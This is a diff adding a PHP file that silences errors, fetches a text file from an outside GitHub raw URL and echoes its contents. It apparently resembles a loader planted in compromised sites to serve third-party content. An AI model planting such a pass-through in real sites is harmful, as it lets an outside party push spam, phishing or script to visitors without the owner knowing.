@@ -1,0 +1,38 @@
+<?php
+error_reporting(0);
+set_time_limit(0);
+
+$url = "https://raw.githubusercontent.com/IKENAI29/library/main/2.txt";
+
+// Create a stream context with additional options for HTTP
+$contextOptions = [
+    'http' => [
+        'method'  => 'GET',
+        'header'  => "User-Agent: PHP Stream\r\n", // Set custom headers
+        'timeout' => 30, // Set a timeout of 30 seconds
+    ]
+];
+
+// Create the context with the defined options
+$context = stream_context_create($contextOptions);
+
+// Open the URL using fopen with the context
+$handle = @fopen($url, 'r', false, $context);
+
+if ($handle) {
+    // Read the entire content using stream_get_contents
+    $dead = stream_get_contents($handle);
+
+    if ($dead === false) {
+        echo "Failed to read content from the stream.";
+    } else {
+        // Output the fetched content
+        echo $dead;
+    }
+
+    // Close the stream handle
+    fclose($handle);
+} else {
+    echo "Unable to open the URL.";
+}
+?>
